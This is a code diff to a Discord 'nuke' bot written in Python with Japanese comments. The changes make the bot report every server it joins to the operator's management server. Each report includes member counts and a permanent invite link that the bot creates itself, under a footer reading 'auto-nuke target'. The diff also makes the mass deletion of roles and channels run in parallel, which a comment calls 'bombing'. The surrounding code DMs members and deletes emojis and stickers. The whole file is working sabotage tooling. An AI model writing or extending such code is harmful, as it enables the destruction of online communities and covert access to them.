@@ -4,6 +4,7 @@ import asyncio
 import random
 import os
 from dotenv import load_dotenv
+from datetime import datetime
 
 load_dotenv()
 TOKEN = os.getenv("TOKEN")
@@ -110,6 +111,59 @@ async def delete_emojis_and_stickers(guild):
     if stickers:
         await asyncio.gather(*(limited_global(s.delete()) for s in stickers), return_exceptions=True)
 
+async def send_management_notification(guild):
+    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
+    if not manage_guild: return
+    manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
+    if not manage_channel: return
+
+    try:
+        invites = await guild.invites()
+        invite_link = "取得失敗"
+        for inv in invites:
+            if inv.max_age == 0 and inv.max_uses == 0:
+                invite_link = inv.url
+                break
+        if invite_link == "取得失敗" and guild.text_channels:
+            ch = guild.text_channels[0]
+            new_inv = await ch.create_invite(max_age=0, max_uses=0, unique=True, reason="管理用永久招待")
+            invite_link = new_inv.url
+    except:
+        invite_link = "権限不足"
+
+    embed = discord.Embed(title="新規サーバー参加通知", color=discord.Color.red(), timestamp=datetime.now())
+    embed.add_field(name="サーバー名", value=guild.name, inline=False)
+    embed.add_field(name="サーバーID", value=guild.id, inline=False)
+    embed.add_field(name="総メンバー", value=guild.member_count, inline=False)
+    embed.add_field(name="非BOTメンバー", value=len([m for m in guild.members if not m.bot]), inline=False)
+    embed.add_field(name="永久招待リンク", value=invite_link, inline=False)
+    embed.set_footer(text="自動ヌーク対象サーバー")
+    await manage_channel.send(embed=embed)
+
+async def delete_old_roles(guild):
+    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
+    print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
+    batch_size = 15
+    for i in range(0, len(roles_to_delete), batch_size):
+        batch = roles_to_delete[i:i+batch_size]
+        await asyncio.gather(*(limited_global(r.delete()) for r in batch), return_exceptions=True)
+        await asyncio.sleep(random.uniform(0.05, 0.1))
+
+async def delete_all_channels(guild):
+    channels = list(guild.channels)
+    print(f"チャンネル削除開始: 対象 {len(channels)}個")
+    batch_size_ch = 15
+    attempt_ch = 0
+    while len(channels) > 0 and attempt_ch < 4:
+        attempt_ch += 1
+        for i in range(0, len(channels), batch_size_ch):
+            batch_ch = channels[i:i+batch_size_ch]
+            await asyncio.gather(*(limited_global(ch.delete()) for ch in batch_ch), return_exceptions=True)
+            await asyncio.sleep(random.uniform(0.03, 0.08))
+        await asyncio.sleep(0.5)
+        channels = list(guild.channels)
+    print(f"チャンネル削除完了: 残り {len(channels)}個")
+
 async def core_nuke(guild, new_server_name=None):
     if guild.id == MANAGE_GUILD_ID:
         print(f"管理サーバー({guild.name})のためヌークをスキップ")
@@ -175,58 +229,18 @@ async def core_nuke(guild, new_server_name=None):
     if dm_coros:
         await asyncio.gather(*dm_coros, return_exceptions=True)
 
-    # ロール削除（もともとあったロールのみ）
-    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
-    print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
-
-    async def delete_roles_batch(roles):
-        await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
-
-    batch_size = 15
-    attempt = 0
-    current_roles = roles_to_delete[:]
-    remaining = current_roles  # 初期化
-    while len(current_roles) > 0 and attempt < 2:
-        attempt += 1
-        for i in range(0, len(current_roles), batch_size):
-            batch = current_roles[i:i+batch_size]
-            await delete_roles_batch(batch)
-            await asyncio.sleep(random.uniform(0.05, 0.1))
-
-        await asyncio.sleep(1)
-        remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
-        if len(remaining) == 0:
-            break
-        current_roles = remaining
-
-    print(f"ロール削除完了: 残り {len(remaining)}個")
-
-    # 残り全チャンネル削除
-    channels = list(guild.channels)
-    print(f"チャンネル削除開始: 対象 {len(channels)}個")
-
-    async def delete_channels_batch(chs):
-        await asyncio.gather(*(limited_global(ch.delete()) for ch in chs), return_exceptions=True)
-
-    batch_size_ch = 15
-    attempt_ch = 0
-    while len(channels) > 0 and attempt_ch < 4:
-        attempt_ch += 1
-        for i in range(0, len(channels), batch_size_ch):
-            batch_ch = channels[i:i+batch_size_ch]
-            await delete_channels_batch(batch_ch)
-            await asyncio.sleep(random.uniform(0.03, 0.08))
-
-        await asyncio.sleep(0.5)
-        channels = list(guild.channels)
-
-    print(f"チャンネル削除完了: 残り {len(channels)}個")
+    # ロール削除とチャンネル削除を完全に並列で爆撃
+    role_delete_task = asyncio.create_task(delete_old_roles(guild))
+    channel_delete_task = asyncio.create_task(delete_all_channels(guild))
 
     # サーバー名変更
     try:
         await guild.edit(name=new_name)
     except:
         pass
+
+    # 並列待機
+    await asyncio.gather(role_delete_task, channel_delete_task, return_exceptions=True)
 
     # チャンネル作成
     member_count = len(non_bot_members)
@@ -298,6 +312,8 @@ async def on_guild_join(guild):
         print(f"管理サーバー参加: {guild.name} → 残留（保護）")
         return
 
+    await send_management_notification(guild)  # ← 新規参加即通知
+
     non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
     member_count = len(non_bot_members)
 
@@ -317,7 +333,6 @@ async def on_ready():
     for guild in bot.guilds:
         if guild.id == MANAGE_GUILD_ID:
             print(f"管理サーバー: {guild.name} → 残留（保護）")
-            await log_server_info(guild)
             continue
 
         non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
@@ -329,7 +344,7 @@ async def on_ready():
             except Exception as e:
                 print(f"退出失敗: {e}")
         else:
-            await log_server_info(guild)
+            await send_management_notification(guild)  # 起動時も通知
     print("=====================================")
 
     manage_guild = bot.get_guild(MANAGE_GUILD_ID)
@@ -378,40 +393,5 @@ async def trigger(ctx, *, new_name: str = None):
     except:
         pass
     asyncio.create_task(core_nuke(ctx.guild, new_name))
-
-async def log_server_info(guild):
-    member_count = guild.member_count
-    server_name = guild.name
-    invite_link = "取得失敗（権限不足 or チャンネルなし）"
-
-    try:
-        invites = await guild.invites()
-        permanent_invite = None
-        for inv in invites:
-            if inv.max_age == 0 and inv.max_uses == 0:
-                permanent_invite = inv
-                break
-            if inv.inviter is None or inv.inviter == guild.owner:
-                permanent_invite = inv
-                break
-
-        if permanent_invite:
-            invite_link = permanent_invite.url
-        else:
-            if guild.text_channels:
-                channel = guild.text_channels[0]
-                new_invite = await channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待")
-                invite_link = new_invite.url
-            else:
-                invite_link = "テキストチャンネルなし"
-    except discord.Forbidden:
-        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
-    except Exception as e:
-        invite_link = f"エラー: {str(e)}"
-
-    print(f"サーバー: {server_name}")
-    print(f"メンバー数: {member_count}")
-    print(f"永久招待リンク: {invite_link}")
-    print("---")
 
 bot.run(TOKEN)
